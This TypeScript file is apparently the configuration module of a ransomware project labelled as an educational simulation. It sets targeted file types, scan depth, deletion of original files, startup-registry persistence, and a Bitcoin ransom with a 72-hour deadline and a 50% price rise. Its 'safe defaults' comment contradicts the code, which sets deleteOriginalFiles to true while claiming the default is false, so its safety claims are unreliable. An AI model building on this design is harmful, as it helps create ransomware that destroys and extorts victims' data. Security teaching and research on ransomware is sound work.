// RansomwareConfig - Configuration file for ransomware simulation options
// For educational purposes only

export interface RansomwareConfig {
    // Core behavior
    deleteOriginalFiles: boolean // Whether to delete original files after encryption

    // File targeting
    maxScanDepth: number // Maximum directory depth for file scanning
    maxTargetFileSizeMB: number // Maximum file size to encrypt (in MB)
    maxFilesToEncrypt: number // Maximum number of files to encrypt in test mode
    skipHiddenFiles: boolean // Whether to skip hidden files

    // File extensions to target (empty array means use default list)
    targetExtensions: string[] // Override default target extensions

    // Directories to exclude from encryption (empty array means use default list)
    excludedDirectories: string[] // Override default excluded directories

    // Encryption settings
    encryptedExtension: string // Extension to add to encrypted files

    // Persistence settings
    createStartupEntries: boolean // Whether to create startup registry entries
    createBackupKeys: boolean // Whether to create backup decryption keys

    // Ransom settings
    ransomAmount: number // Ransom amount in cryptocurrency
    ransomCurrency: string // Cryptocurrency type (BTC, ETH, XMR, etc.)
    ransomDeadlineHours: number // Deadline in hours before price increases
    ransomPriceIncrease: number // Percentage price increase after deadline

    // Appearance
    changeWallpaper: boolean // Whether to change the desktop wallpaper
}

// Default configuration
export const DEFAULT_CONFIG: RansomwareConfig = {
    // Core behavior - safe defaults for educational purposes
    deleteOriginalFiles: true, // Default is false for safety

    // File targeting
    maxScanDepth: 3, // Reasonable depth for demonstrations
    maxTargetFileSizeMB: 10, // Default max file size (10MB)
    maxFilesToEncrypt: 5, // Default number of files for test mode
    skipHiddenFiles: true, // Skip hidden files by default

    // Use the default lists from fileScanner.ts
    targetExtensions: [], // Empty means use default list
    excludedDirectories: [], // Empty means use default list

    // Encryption settings
    encryptedExtension: '.encrypted', // Default extension for encrypted files

    // Persistence settings - disabled by default
    createStartupEntries: false, // Disabled for safety
    createBackupKeys: true, // Backup keys enabled for educational recovery

    // Ransom settings
    ransomAmount: 0.05, // Default amount (in crypto)
    ransomCurrency: 'BTC', // Default currency
    ransomDeadlineHours: 72, // 3 days deadline
    ransomPriceIncrease: 50, // 50% price increase after deadline

    // Appearance
    changeWallpaper: false // Don't change wallpaper by default
}

// Load configuration from file if exists, otherwise use default
export function loadConfig(): RansomwareConfig {
    try {
        // In a real implementation, this would load from a config file
        // For now, we just return the default config
        return { ...DEFAULT_CONFIG }
    } catch (error) {
        console.error('Failed to load config, using defaults:', error)
        return { ...DEFAULT_CONFIG }
    }
}

// Get a specific configuration value
export function getConfigValue<K extends keyof RansomwareConfig>(
    key: K
): RansomwareConfig[K] {
    const config = loadConfig()
    return config[key]
}
